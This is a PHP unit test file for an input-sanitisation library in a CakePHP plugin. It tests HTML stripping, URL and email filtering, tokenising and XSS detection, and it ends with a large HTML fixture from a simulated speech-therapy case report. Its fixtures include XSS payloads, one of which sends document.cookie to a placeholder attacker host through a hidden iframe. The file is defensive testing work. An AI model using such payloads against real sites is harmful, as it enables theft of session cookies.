<?php
/**
 * Unit Test for InputClean
 *
 * cake test In Lib/InputClean
 *
 * @package Input-CakePHP-Plugin
 * @link https://github.com/zeroasterisk/Input-CakePHP-Plugin
 */
App::uses('InputClean', 'Input.Lib');
App::uses('AppTestCase','Lib');

class InputCleanTest extends AppTestCase {

	public $fixtures = array();

	public function setUp() {
		parent::setUp();
		$this->InputClean = new InputClean;

		// all of these are potentially XSS attacks
		$this->xss = [
			0 => 'foobar<script>document.write(\'<iframe src="http://evilattacker.com?cookie=\'' . "\n" .
				' + document.cookie.escape() + \'" height=0 width=0 />\');</script>foobar',
			1 => 'foobar<a href="javascript:alert(1)">x</a>',
			2 => 'foobar<a href="#" style="danger">x</a>',
		];
	}

	public function tearDown() {
		parent::tearDown();
		unset($this->InputClean);
		ClassRegistry::flush();
	}

	public function testAllNoChanges() {
		$config = InputClean::configDefault();
		$v = [
			'abc' => 'abc',
			'Model' => [
				'name' => 'input cleaner',
				'email' => 'valid@example.com',
				'password' => '!@#$%^&*()',
				'url' => 'http://example.com/funky?something=1#anchor',
			]
		];
		$this->assertEqual(
			InputClean::all($v, $config),
			$v
		);
	}
	public function testAllChanges() {
		$config = InputClean::configDefault();
		$config['fields']['/.*\.html/'] = 'html';
		$config['fields']['/.*\.anything/'] = 'anything';
		$v = [
			'abc' => 'abc<a href="#htmlnotallowed">:(</a>',
			'html' => 'abc<a href="#htmlnotallowed">:(</a>',
			'anything' => 'abc<a href="#htmlnotallowed">:(</a>',
			'Model' => [
				'name' => 'input cleaner <strong>nohtml</strong>',
				'email' => 'valid@example.com#+subject=badcharfor' . "\n" . 'email',
				'password' => '!@#$%^&*()',
				'url' => 'http://example.com/funk'. "\n" . 'y?something=1#anchor',
				'html' => 'abc <a href="#html-allowed">:)</a>',
				'anything' => 'abc <a href="#html-allowed">:)</a>',
			]
		];
		$expect = [
			'abc' => 'abc:(',
			'html' => 'abc:(',
			'anything' => 'abc:(',
			'Model' => [
				'name' => 'input cleaner nohtml',
				'email' => 'valid@example.com#+subject=badcharforemail',
				'password' => '!@#$%^&*()',
				'url' => 'http://example.com/funky?something=1#anchor',
				'html' => 'abc <a href="#html-allowed">:)</a>',
				'anything' => 'abc <a href="#html-allowed">:)</a>',
			]
		];
		$this->assertEqual(
			InputClean::all($v, $config),
			$expect
		);
	}

	public function testFieldMatchDefault() {
		$pattern = '*';
		$this->assertTrue(
			InputClean::fieldMatch($pattern, 'basic')
		);
		$this->assertTrue(
			InputClean::fieldMatch($pattern, 'Model.field')
		);
		$this->assertTrue(
			InputClean::fieldMatch($pattern, 'Model.0.has_many')
		);
		$this->assertFalse(
			InputClean::fieldMatch($pattern, '')
		);
		$this->assertFalse(
			InputClean::fieldMatch($pattern, null)
		);
		$this->assertFalse(
			InputClean::fieldMatch($pattern, false)
		);
		$this->assertFalse(
			InputClean::fieldMatch('', 'basic')
		);
	}

	public function testFieldMatchBasic() {
		$this->assertTrue(
			InputClean::fieldMatch('basic', 'basic')
		);
		$this->assertTrue(
			InputClean::fieldMatch('Model.field', 'Model.field')
		);
		$this->assertTrue(
			InputClean::fieldMatch('Model.0.has_many', 'Model.0.has_many')
		);
		$this->assertFalse(
			InputClean::fieldMatch('basic', 'Model.basic')
		);
		$this->assertFalse(
			inputclean::fieldmatch('basic', '.basic')
		);
		$this->assertFalse(
			inputclean::fieldmatch('basic', 'basic.')
		);
		$this->assertFalse(
			InputClean::fieldMatch('Model.field', 'Model.')
		);
		$this->assertFalse(
			InputClean::fieldMatch('Model.field', 'field')
		);
		$this->assertFalse(
			InputClean::fieldMatch('Model.field', '.field')
		);
		$this->assertFalse(
			InputClean::fieldMatch('Model.field', 'Mode*.field')
		);
		$this->assertFalse(
			InputClean::fieldMatch('Model.field', 'Mode%.field')
		);
		$this->assertFalse(
			InputClean::fieldMatch('Model.0.has_many', 'Model.1.has_many')
		);
	}

	public function testFieldMatchPregMatch() {
		$pattern = '/Model\..*field$/';
		$this->assertFalse(
			InputClean::fieldMatch($pattern, 'basic')
		);
		$this->assertTrue(
			InputClean::fieldMatch($pattern, 'Model.field')
		);
		$this->assertFalse(
			InputClean::fieldMatch($pattern, 'Model.0.has_many')
		);
		$this->assertTrue(
			InputClean::fieldMatch($pattern, 'Model.0.has_many_field')
		);
		$this->assertFalse(
			InputClean::fieldMatch($pattern, '')
		);

		$pattern = '/.*\.html/';
		$this->assertFalse(
			InputClean::fieldMatch($pattern, 'Model.0.has_many_html')
		);
		$this->assertTrue(
			InputClean::fieldMatch($pattern, 'Model.0.html')
		);
		$this->assertTrue(
			InputClean::fieldMatch($pattern, 'Model.0.html_withSuffix')
		);
	}

	public function testFieldMatchFnmatch() {
		$pattern = 'Model.*field';
		$this->assertFalse(
			InputClean::fieldMatch($pattern, 'basic')
		);
		$this->assertTrue(
			InputClean::fieldMatch($pattern, 'Model.field')
		);
		$this->assertFalse(
			InputClean::fieldMatch($pattern, 'Model.0.has_many')
		);
		$this->assertTrue(
			InputClean::fieldMatch($pattern, 'Model.0.has_many_field')
		);
		$this->assertFalse(
			InputClean::fieldMatch($pattern, '')
		);
	}

	public function testCleanField() {
		$config = InputClean::configDefault();
		$this->assertEqual(
			InputClean::cleanField('foo<strong>bar</strong> ' .
			'here', 'basic', $config),
			'foobar here'
		);
		// FILTER_SANITIZE_STRING (+ strip_tags)
		$this->assertEqual(
			InputClean::cleanField('foo<strong>bar</strong> ' .
			'here', 'Modle.basic', $config),
			'foobar here'
		);
		// FILTER_SANITIZE_URL
		// Remove all characters except letters, digits and
		// $-_.+!*'(),{}|\\^~[]`<>#%";/?:@&=.
		$this->assertEqual(
			InputClean::cleanField('http://exam'.
			"\n\r\t <>" . // << should be stripped
			'ple.com/path?query=1#anchor', 'Modle.url', $config),
			'http://example.com/path?query=1#anchor'
		);
		// FILTER_SANITIZE_EMAIL
		// Remove all characters except letters, digits and
		// !#$%&'*+-/=?^_`{|}~@.[].`
		$this->assertEqual(
			InputClean::cleanField('valid+target@exam'.
			"\n\r\t \"()<>" . // << should be stripped
			'ple.com?subject=funky', 'Modle.email', $config),
			'valid+target@example.com?subject=funky'
		);
	}

	public function testCleanAnything() {
	}
	public function testCleanBlacklist() {
		$config = InputClean::configDefault();
		$unchanged = [
			true, false, null, array(), $this, '', ' ',
			"foobar \n\r\t!@#$%^&*()`~[]{}(),.;'\"/\\|: foobar",
			"foobar > isolated GT allowed",
			"foobar &nbsp; entities allowed",
			htmlentities("foobar \n\r\t!@#$%^&*()`~[]{}(),.;'\"/\\|: foobar"),
			htmlentities('foobar <a href="#">escaped</a>')
		];
		foreach ($unchanged as $v) {
			$this->assertEqual(
				InputClean::clean($v, 'blacklist', $config),
				$v
			);
		}
	}

	public function testCleanString() {
		$config = InputClean::configDefault();
		$unchanged = [
			true, false, null, array(), $this, '', ' ',
			"foobar \n\r\t!@#$%^&*()`~[]{}(),.;'\"/\\|: foobar",
			"foobar > isolated GT allowed",
			"foobar &nbsp; entities allowed",
			htmlentities("foobar \n\r\t!@#$%^&*()`~[]{}(),.;'\"/\\|: foobar"),
			htmlentities('foobar <a href="#">escaped</a>')
		];
		foreach ($unchanged as $v) {
			$this->assertEqual(
				InputClean::clean($v, 'string', $config),
				$v
			);
		}

		$this->assertEqual(
			InputClean::clean("foobar < isolated LT not allowed (because of strip_tags)", 'string', $config),
			'foobar '
		);
		$this->assertEqual(
			InputClean::clean('foobar <a href="#" class="css" style="no xss">link</a> foobar', 'string', $config),
			'foobar link foobar'
		);
		$this->assertEqual(
			InputClean::clean('foobar <> no empty tag', 'string', $config),
			'foobar  no empty tag'
		);
		$this->assertEqual(
			InputClean::clean('foobar <!--e--> no comment tag', 'string', $config),
			'foobar  no comment tag'
		);
		$this->assertEqual(
			InputClean::clean('foobar <a href="#" no broken tag', 'string', $config),
			'foobar '
		);
		$this->assertEqual(
			InputClean::clean('foobar <!--e-- no broken comment tag', 'string', $config),
			'foobar '
		);

		// string XSS = always false (since HTML is stripped/sanitized)
		foreach ($this->xss as $i => $v) {
			// filter cleans string...  XSS doesn't find anything
			$r = InputClean::clean($v, 'string', $config);
			$this->assertFalse(empty($r));
		}
	}

	public function testCleanHtml() {
		$config = InputClean::configDefault();
		$unchanged = [
			true, false, null, array(), $this, '', ' ',
			"foobar \n\r\t!@#$%^&*()`~[]{}(),.;'\"/\\|: foobar",
			"foobar > isolated GT allowed",
			"foobar < isolated LT allowed",
			"foobar &nbsp; entities allowed",
			htmlentities("foobar \n\r\t!@#$%^&*()`~[]{}(),.;'\"/\\|: foobar"),
			htmlentities('foobar <a href="#">escaped</a>'),

			// HTML is allowed (but XSS will still throw exceptions)
			'foobar <a href="#" class="css">link</a> foobar',
			'foobar <> no empty tag',
			'foobar <a href="#" no broken tag',
			'foobar <!--e-- no broken comment tag',
		];
		foreach ($unchanged as $v) {
			$this->assertEqual(
				InputClean::clean($v, 'html', $config),
				$v
			);
		}

		// changing things, because we are still calling strip_scripts() for HTML
		$this->assertEqual(
			InputClean::clean('foobar <!--e--> no comment tag', 'html', $config),
			'foobar  no comment tag'
		);
		$this->assertEqual(
			InputClean::clean('foobar <script src="blah"></script> no script tag', 'html', $config),
			'foobar  no script tag'
		);
		$this->assertEqual(
			InputClean::clean('foobar <script>blah</script> no script tag', 'html', $config),
			'foobar  no script tag'
		);
		$this->assertEqual(
			InputClean::clean('foobar <iframe src="blah">blah</iframe> no iframe tag', 'html', $config),
			'foobar  no iframe tag'
		);

		// verify XSS

		//  unset strip_scripts so XSS is more likely to hit...
		$config['sanitizationKeyMap']['html']['strip_scripts'] = false;
		foreach ($this->xss as $i => $v) {
			// verify XSS Exception
			try {
				$r = InputClean::clean($v, 'html', $config);
				$this->assertEqual($r, '', 'Should have thrown an UnsafeInputException');
			} catch (UnsafeInputException $e) {
				$this->assertEqual(
					$e->getMessage(),
					sprintf('Unsafe Input Detected [hash: %s]',
						md5($v)
					)
				);
			}
			// no filter...  XSS Exception
			try {
				$r = InputClean::clean($v, ['filter' => false, 'xss' => true]);
				$this->assertEqual($r, '', 'Should have thrown an UnsafeInputException');
			} catch (UnsafeInputException $e) {
				$this->assertEqual(
					$e->getMessage(),
					sprintf('Unsafe Input Detected [hash: %s]',
						md5($v)
					)
				);
			}

			// no filter...  XSS doesn't run
			$this->assertEqual(
				InputClean::clean($v, ['filter' => false, 'xss' => false]),
				$v
			);

			// filter cleans string...  XSS doesn't run
			$r = InputClean::clean($v, ['filter' => FILTER_SANITIZE_STRING, 'xss' => false]);
			$this->assertFalse(empty($r));

			// filter cleans string...  XSS doesn't find anything
			$r = InputClean::clean($v, ['filter' => FILTER_SANITIZE_STRING, 'xss' => true]);
			$this->assertFalse(empty($r));
		}
	}

	public function testConfig() {
	}

	public function testDetectXSS() {

		$v = 'foobar<script>document.write(\'<iframe src="http://evilattacker.com?cookie=\'' . "\n" .
		' + document.cookie.escape() + \'" height=0 width=0 />\');</script>foobar';
		$this->assertTrue(InputClean::detectXSS($v));

		$v = 'foobar <script>...foobar';
		$this->assertTrue(InputClean::detectXSS($v));
		$v = 'foobar script...foobar';
		$this->assertFalse(InputClean::detectXSS($v));

		$v = 'foobar <a href="#" style="badstuff">foo</a>bar';
		$this->assertTrue(InputClean::detectXSS($v));
		$v = 'foobar <a href="#" class="badstuff">foo</a>bar';
		$this->assertFalse(InputClean::detectXSS($v));

		// fixed a problem with "data:123" matching
		$v = 'foobar data:100 yxz';
		$this->assertFalse(InputClean::detectXSS($v));
		$v = 'data:100';
		$this->assertFalse(InputClean::detectXSS($v));

		// some more known "bad" values
		//   javascript:, livescript:, vbscript: and mocha: protocols
		$v = 'javascript:foobar';
		$this->assertTrue(InputClean::detectXSS($v));
		$v = 'foobar javascript:foobar xyz';
		$this->assertTrue(InputClean::detectXSS($v));
		$v = 'foobarjavascript:foobarxyz';
		$this->assertTrue(InputClean::detectXSS($v));
		$v = 'foobarvbscript:foobarxyz';
		$this->assertTrue(InputClean::detectXSS($v));
		$v = 'foobarlivescript:foobarxyz';
		$this->assertTrue(InputClean::detectXSS($v));
		$v = 'foobarmocha:foobarxyz';
		$this->assertTrue(InputClean::detectXSS($v));
		// does not match script: protocol
		$v = 'foobarscript:foobarxyz';
		$this->assertFalse(InputClean::detectXSS($v));
		// does not match javascript= protocol
		$v = 'foobar javascript=foobar xyz';
		$this->assertFalse(InputClean::detectXSS($v));
		// does not match javascript protocol
		$v = 'foobar javascript xyz';
		$this->assertFalse(InputClean::detectXSS($v));

		// TODO: more tests to demonstrate functionality
	}



	// demonstrate that <email@example.com> is not stripped
	//   even though it normally would be in PHP, without this tokenize process
	public function testTokenizeInCleanEmailInArrows() {
		// this config should be on/set by default
		//   but putting it into this unit-test just to be "sure"
		$config = InputClean::configDefault();
		$config['sanitizationKeyMap']['string']['tokenize'] = ['emailInArrows'];
		// not found, normal
		$this->assertEqual(
			InputClean::clean('foobar <strong>html</strong>', 'string', $config),
			'foobar html'
		);
		// email in arrows found, and allowed "<$email>"
		//   this only makes it past strip_tags() because
		//   it's first tokenized, and then later, detokenized
		$this->assertEqual(
			InputClean::clean('foobar <email@example.com> <strong>html</strong>', 'string', $config),
			'foobar <email@example.com> html'
		);
	}

	// demonstrate that bad emails are not allowed / tokenized
	//   as such, they are stripped
	public function testTokenizeInCleanEmailInArrowsBademails() {
		// this config should be on/set by default
		//   but putting it into this unit-test just to be "sure"
		$config = InputClean::configDefault();
		$config['sanitizationKeyMap']['string']['tokenize'] = ['emailInArrows'];
		// here are a list of possible "bad" non-emails
		//   none of which should match our pattern
		//   so all of them should end up stripped (with the wrapping < >)
		$badEmails = [
			'non@email@example.com',
			'non_email_example_com',
			'non-email@examplecom',
			'non-email',
			'@example.com',
			'non-email@example.com ',
			' non-email@example.com',
			'non-em ail@example.com',
			"non-em\nail@example.com",
		];
		foreach ($badEmails as $badEmail) {
			$this->assertEqual(
				InputClean::clean("foobar <$badEmail> <strong>html</strong>", 'string', $config),
				'foobar  html'
			);
		}
	}

	// disable the emailInArrows tokenize config for string
	//   and verify that it no longer "allows" it through...
	public function testTokenizeInCleanEmailInArrowsDisable() {
		$config = InputClean::configDefault();
		$config['sanitizationKeyMap']['string']['tokenize'] = false;
		$this->assertEqual(
			InputClean::clean('foobar <email@example.com> <strong>html</strong>', 'string', $config),
			'foobar  html'
		);
	}

	// verify that the emailInArrows is defaulted to "on"
	//   just testing default config
	public function testTokenizeInConfigIncludesEmailInArrows() {
		$config = InputClean::configDefault();
		$this->assertTrue(
			in_array('emailInArrows', $config['sanitizationKeyMap']['string']['tokenize'])
		);
		$this->assertTrue(
			in_array('emailInArrows', $config['sanitizationKeyMap']['html']['tokenize'])
		);
	}

	public function testTokenize() {
		$this->assertEqual(
			InputClean::tokenize('foobar', []),
			'foobar'
		);
		$this->assertEqual(
			InputClean::tokenize('foobar', null),
			'foobar'
		);
		$this->assertEqual(
			InputClean::$tokens,
			[]
		);
		$result = InputClean::tokenize('foobar', ['#bar#']);
		$this->assertEqual(
			count(InputClean::$tokens),
			1
		);
		$token = key(InputClean::$tokens);
		$orig = current(InputClean::$tokens);
		$this->assertEqual(
			$result,
			"foo{$token}"
		);
		$this->assertEqual(
			$orig,
			'bar'
		);
	}

	public function testDetokenize() {
		InputClean::tokenizeReset();
		$this->assertEqual(
			InputClean::$tokens,
			[]
		);
		$this->assertEqual(
			InputClean::detokenize('foobar'),
			'foobar'
		);
		InputClean::$tokens = [
			// replaces case sensetive
			'b' => 'X',
			// replaces multiple instances
			'o' => 'x',
		];
		$this->assertEqual(
			InputClean::detokenize('foobarB'),
			'fxxXarB'
		);
		// auto-detokenize
		$this->assertEqual(
			InputClean::$tokens,
			[]
		);
	}

	public function testTokenizeReset() {
		InputClean::$tokens['abc'] = 'abc-foobar';
		InputClean::$tokens['xyz'] = 'xyz-foobar';
		$this->assertEqual(
			InputClean::tokenizeReset(),
			null
		);
		$this->assertEqual(
			InputClean::$tokens,
			[]
		);
	}

	// The following data is causing a segmentation fault
	//   need to debug: 64662 segmentation fault
	public function testFromSimucaseData() {
		$html = <<< EOT
<style type="text/css">.pdf-table td {padding: 0 10px 10px 0}.clipboard-entry-content {width: 500px;border-bottom: 1px solid black;word-wrap: break-word;}.clipboard-contents ul {list-style-type: none;}.clipboard-entry .cause{display:block;margin-bottom: 20px;}.clipboard-entry .clipboard-entry-time{display: block;}.clipboard-contents, .competency-rating{margin-top: 40px;}.clipboard-contents{display: inline;}.bold {font-weight: bold;}/* graded assessment breakdown */.question h5 {padding: 10px 0 0 0;margin: 0;font-weight: bold;}.question ol {padding-top: 5px;margin-top: 0;list-style-type: upper-alpha}/* labels from bootstrap */.label, .badge {display: inline-block;pading: 2px 4px;font-size: 11.844px;font-weight: bold;line-height: 14px;color: #ffffff;text-shadow: 0 -1px 0 rgba(0, 0, 0, 0.25);white-space: nowrap;vertical-align: baseline;background-color: #999999;}.label {-webkit-border-radius: 3px;-moz-border-radius: 3px;border-radius: 3px;}.badge {padding-right: 9px;padding-left: 9px;-webkit-border-radius: 9px;-moz-border-radius: 9px;border-radius: 9px;}.label:empty, .badge:empty {display: none;}a.label:hover, a.label:focus, a.badge:hover, a.badge:focus {color: #ffffff;text-decoration: none;cursor: pointer;}.label-important, .badge-important {background-color: #b94a48;}.label-important[href], .badge-important[href] {background-color: #953b39;}.label-warning, .badge-warning {background-color: #f89406;}.label-warning[href], .badge-warning[href] {background-color: #c67605;}.label-success, .badge-success {background-color: #468847;}.label-success[href], .badge-success[href] {background-color: #356635;}.label-info, .badge-info {background-color: #3a87ad;}.label-info[href], .badge-info[href] {background-color: #2d6987;}.label-inverse, .badge-inverse {background-color: #333333;}.label-inverse[href], .badge-inverse[href] {background-color: #1a1a1a;}.btn .label, .btn .badge {position: relative;top: -1px;}.btn-xs .label, .btn-xs .badge {top: 0;}</style><h1>Results</h1><p class='exam-info'><span class='label'>Client Name: </span> Kara Lynn<br/><span class='label'>Date: </span> November 5, 2014<br/><span class='label'>Mode: </span> Learning</p><table class="pdf-table"><tbody><tr><td>Case History</td><td>16/100</td></tr><tr><td>Collaborators</td><td>71/100</td></tr><tr><td>Hypothesis</td><td>100/100</td></tr><tr><td>Assessments</td><td>50/100</td></tr><tr><td>Diagnosis</td><td>100/100</td></tr><tr><td>Recommendations</td><td>0/100</td></tr><tr><td>Completion Time</td><td>57 Minutes</td></tr></tbody><tfoot><tr class="results-total"><td>Your Competency Score</td><td>56.17%</td></tr></tfoot></table><div class="clipboard-contents"><h2>Clipboard Contents</h2><ul id="clipboard-sections" class="clipboard-sections"><li class="clipboard-section caseHistory  " data-section-id="caseHistory"><div class="clipboard-section-header-container"><h2 class="clipboard-section-header"><span class="clipboard-section-icon"></span>Case History</h2></div><div class="clipboard-section-content "><ul class="clipboard-categories"><li class="clipboard-category   " data-category-id="1" data-category-title="Background Information"><div class="clipboard-category-header-container"><h3 class="clipboard-category-header">Background Information</h3></div><div class="clipboard-category-content   "><ul class="clipboard-entries"><li class="clipboard-entry " data-entry-map-id="0" data-entry-content="What are your concerns?"><div class="clipboard-entry-header-container"></div><div class="clipboard-entry-content cause-effect-container" style="word-wrap:break-word;"><div class="cause"><span class="clipboard-entry-time">12:34:49 AM</span> &nbsp;What are your concerns?</div><div class="effect">I am very concerned about her speech.  I try to help her but I don't know how.  She gets so frustrated with me when I ask her to repeat or simply point to things.  What am I doing wrong?</div></div></li><li class="clipboard-entry " data-entry-map-id="1" data-entry-content="What are the speech or language difficulties Kara Lynn has?"><div class="clipboard-entry-header-container"></div><div class="clipboard-entry-content cause-effect-container" style="word-wrap:break-word;"><div class="cause"><span class="clipboard-entry-time">12:35:04 AM</span> &nbsp;What are the speech or language difficulties Kara Lynn has?</div><div class="effect">She is really hard to understand because of the difficulty she has with saying all sorts of sounds.  </div></div></li><li class="clipboard-entry " data-entry-map-id="2" data-entry-content="Has Kara Lynn ever received diagnostic or therapeutic services for his/her speech problem?"><div class="clipboard-entry-header-container"></div><div class="clipboard-entry-content cause-effect-container" style="word-wrap:break-word;"><div class="cause"><span class="clipboard-entry-time">12:35:12 AM</span> &nbsp;Has Kara Lynn ever received diagnostic or therapeutic services for his/her speech problem?</div><div class="effect">No.</div></div></li></ul></div></li><li class="clipboard-category   " data-category-id="2" data-category-title="User Entered Questions"><div class="clipboard-category-header-container"><h3 class="clipboard-category-header">User Entered Questions</h3></div><div class="clipboard-category-content   "><ul class="clipboard-entries"><li class="clipboard-entry " data-entry-map-id="0" data-entry-content="why do you think you're doing something wrong?
"><div class="clipboard-entry-header-container"></div><div class="clipboard-entry-content cause-effect-container" style="word-wrap:break-word;"><div class="cause"><span class="clipboard-entry-time">12:35:48 AM</span> &nbsp;why do you think you're doing something wrong?
</div><div class="effect">I just don't know why she is having so much trouble talking.</div></div></li><li class="clipboard-entry " data-entry-map-id="1" data-entry-content="are there words she has difficulty with?
"><div class="clipboard-entry-header-container"></div><div class="clipboard-entry-content cause-effect-container" style="word-wrap:break-word;"><div class="cause"><span class="clipboard-entry-time">12:36:02 AM</span> &nbsp;are there words she has difficulty with?
</div><div class="effect">Yes, she has an extremely hard time saying longer words like elephant, spaghetti, and macaroni and cheese.</div></div></li></ul></div></li></ul></div></li><li class="clipboard-section collaborators  " data-section-id="collaborators"><div class="clipboard-section-header-container"><h2 class="clipboard-section-header"><span class="clipboard-section-icon"></span>Collaborators</h2></div><div class="clipboard-section-content "><ul class="clipboard-categories"><li class="clipboard-category   " data-category-id="1" data-category-title="Teacher"><div class="clipboard-category-header-container"><h3 class="clipboard-category-header">Teacher</h3></div><div class="clipboard-category-content   "><ul class="clipboard-entries"><li class="clipboard-entry " data-entry-map-id="0" data-entry-content="You contact the Teacher."><div class="clipboard-entry-header-container"></div><div class="clipboard-entry-content cause-effect-container" style="word-wrap:break-word;"><div class="cause"><span class="clipboard-entry-time">12:39:12 AM</span> &nbsp;You contact the Teacher.</div><div class="effect">Hello, this is Ms. Emily Jenkins.  Kara Lynn is a student in my class this year.  She is a very bright young girl who loves being in school.  However, I am concerned with her speech development.  I just recently completed a developmental checklist for her and will fax that to your inbox now.  A nurse practitioner visited my classroom this week and screened all of the students' hearing.  I can't find my copy of her hearing results right now, but I will do my best to answer any questions you may have.</div></div></li><li class="clipboard-entry " data-entry-map-id="1" data-entry-content="Developmental Checklist 3-4 from Teacher"><div class="clipboard-entry-header-container"></div><div class="clipboard-entry-content cause-effect-container" style="word-wrap:break-word;"><div class="cause"><span class="clipboard-entry-time">12:39:12 AM</span> &nbsp;File Attachment</div><div class="effect"><a href="http://sc-media.speechpathology.com/10.pdf" class="" target="_blank">Developmental Checklist 3-4 from Teacher</a></div></div></li><li class="clipboard-entry " data-entry-map-id="2" data-entry-content="You contact the Teacher."><div class="clipboard-entry-header-container"></div><div class="clipboard-entry-content cause-effect-container" style="word-wrap:break-word;"><div class="cause"><span class="clipboard-entry-time">12:41:04 AM</span> &nbsp;You contact the Teacher.</div><div class="effect">Hello, this is Ms. Emily Jenkins.  Kara Lynn is a student in my class this year.  She is a very bright young girl who loves being in school.  However, I am concerned with her speech development.  I just recently completed a developmental checklist for her and will fax that to your inbox now.  A nurse practitioner visited my classroom this week and screened all of the students' hearing.  I can't find my copy of her hearing results right now, but I will do my best to answer any questions you may have.</div></div></li><li class="clipboard-entry " data-entry-map-id="3" data-entry-content="how is she doing in class?
"><div class="clipboard-entry-header-container"></div><div class="clipboard-entry-content cause-effect-container" style="word-wrap:break-word;"><div class="cause"><span class="clipboard-entry-time">12:41:45 AM</span> &nbsp;how is she doing in class?
</div><div class="effect">Other than her speech, she is doing great.  She is beginning to recognize and write a few letters in the alphabet.  She seems to be developing typically and socially gets along well with her peers.  Kara really is a joy to have in the classroom.</div></div></li><li class="clipboard-entry " data-entry-map-id="4" data-entry-content="does she get frustrated with her speech?
"><div class="clipboard-entry-header-container"></div><div class="clipboard-entry-content cause-effect-container" style="word-wrap:break-word;"><div class="cause"><span class="clipboard-entry-time">12:42:04 AM</span> &nbsp;does she get frustrated with her speech?
</div><div class="effect">Yes, she gets frustrated when she has to repeat herself several times.  Sometimes she even cries.  I try to help her, but I don't know what to do.</div></div></li></ul></div></li><li class="clipboard-category   " data-category-id="2" data-category-title="Nurse Practitioner"><div class="clipboard-category-header-container"><h3 class="clipboard-category-header">Nurse Practitioner</h3></div><div class="clipboard-category-content   "><ul class="clipboard-entries"><li class="clipboard-entry " data-entry-map-id="0" data-entry-content="You contact the Nurse Practitioner."><div class="clipboard-entry-header-container"></div><div class="clipboard-entry-content cause-effect-container" style="word-wrap:break-word;"><div class="cause"><span class="clipboard-entry-time">12:40:07 AM</span> &nbsp;You contact the Nurse Practitioner.</div><div class="effect">Hello, this is Susan.  I recently completed hearing screenings on all of the preschool students in Kara's classroom.  It looks like Kara's hearing screening was within normal limits.  I will fax you her screening results to your inbox now.  Is there anything else I can I help you with today?</div></div></li><li class="clipboard-entry " data-entry-map-id="1" data-entry-content="Hearing Screening from Nurse Practitioner"><div class="clipboard-entry-header-container"></div><div class="clipboard-entry-content cause-effect-container" style="word-wrap:break-word;"><div class="cause"><span class="clipboard-entry-time">12:40:07 AM</span> &nbsp;File Attachment</div><div class="effect"><a href="http://sc-media.speechpathology.com/20.pdf" class="" target="_blank">Hearing Screening from Nurse Practitioner</a></div></div></li><li class="clipboard-entry " data-entry-map-id="2" data-entry-content="did you notice anything about her speech?
"><div class="clipboard-entry-header-container"></div><div class="clipboard-entry-content cause-effect-container" style="word-wrap:break-word;"><div class="cause"><span class="clipboard-entry-time">12:40:49 AM</span> &nbsp;did you notice anything about her speech?
</div><div class="effect">Yes. I was going to recommend that she be evaluated by you, and I am glad you have begun the evaluation process.</div></div></li></ul></div></li></ul></div></li><li class="clipboard-section clinicalHypothesis  " data-section-id="clinicalHypothesis"><div class="clipboard-section-header-container"><h2 class="clipboard-section-header"><span class="clipboard-section-icon"></span>Hypothesis</h2></div><div class="clipboard-section-content "><ul class="clipboard-categories"><li class="clipboard-category   " data-category-id="1" data-category-title="Hypothesis #1"><div class="clipboard-category-header-container"><h3 class="clipboard-category-header">Hypothesis #1</h3></div><div class="clipboard-category-content   "><ul class="clipboard-entries"><li class="clipboard-entry " data-entry-map-id="0" data-entry-content="Kara lynn exhibits a speech sound disorder"><div class="clipboard-entry-header-container"><span class="clipboard-entry-time">12:42:55 AM</span></div><ul class="clipboard-entry-content clinical-hypothesis-container" style="word-wrap:break-word;"><li class="odd"><span class="entry-label">Hypothesis:</span>Kara lynn exhibits a speech sound disorder</li><li class="even"><span class="entry-label">Action Plan:</span>jjjjjjj</li></ul></li></ul></div></li></ul></div></li><li class="clipboard-section assessments  " data-section-id="assessments"><div class="clipboard-section-header-container"><h2 class="clipboard-section-header"><span class="clipboard-section-icon"></span>Assessments</h2></div><div class="clipboard-section-content "><ul class="clipboard-categories"><li class="clipboard-category   " data-category-id="1" data-category-title="Articulation and Phonology"><div class="clipboard-category-header-container"><h3 class="clipboard-category-header">Articulation and Phonology</h3></div><div class="clipboard-category-content   "><ul class="clipboard-entries"><li class="clipboard-entry " data-entry-map-id="0" data-entry-content="Goldman-Fristoe Test of Articulation 2 and Khan-Lewis Phonological Analysis, 2nd Ed."><div class="clipboard-entry-header-container"></div><div class="clipboard-entry-content cause-effect-container" style="word-wrap:break-word;"><div class="cause"><span class="clipboard-entry-time">12:43:30 AM</span> &nbsp;Goldman-Fristoe Test of Articulation 2 and Khan-Lewis Phonological Analysis, 2nd Ed.</div><div class="effect">Results: GFTA-2 Results: Standard Score: 62 Percentile: 5 Confidence Interval: 56-68.  KLPA-2 Results: Results: Standard Score: 74 Percentile: 5 Confidence Interval: 68-80.  Notes: GFTA-2 Test results show the following substitutions of speech sounds in the initial positions of words:/d/ for /t/, /d/ for /k/, /d/ for /g/, /d/ for /s/, /d/ for /z/, /d/ for /ʃ/, /d/ for /tʃ/, /d/ for /θ/, /d/ for /ð/, /g/ for /d/, /l/ for /w/, /t/ for /f/, /b/ for /v/, and /w/ for /r/.
Substitutions of speech sounds in the medial position of words included: /t/ for /k/,  /t/ for /f/, /t/ for /ʃ/, /d/ for /v/, /d/ for /s/, /d/ for /ð/, /n/ for /ŋ/, /w/ for /r/, and /ts/ for /tʃ/.
Speech sound substitutions in the final position of words included: /d/ for /g/, /t/ for /f/, /t/ for/ʃ/, /ts/ for /tʃ/, /l/ for /j/, and /f/ for /θ/.
Sound omissions included /g/ and /θ/ in the medial position of words and /t/, /d/, /k/, /n/, /v/, and /z/ in the final position of words.
Vowelized /r/ and /l/ were also present in the final position of words.
The GFTA-2 also assessed the ability to produce blends in single words.  The following substitutions were noted:  /b/ for /bl/, /b/ for /br/, /p/ for /pl/, /p/ for /sp/, /d/ for /fl/, /d/ for /kl/, /d/ for /gl/, /d/ for /sl/, /d/ for /dr/, /d/ for /kr/, /d/ for /st/, /d/ for /sw/, /t/ for /tr/, /g/ for /fr/, and /g/ for /gr/.
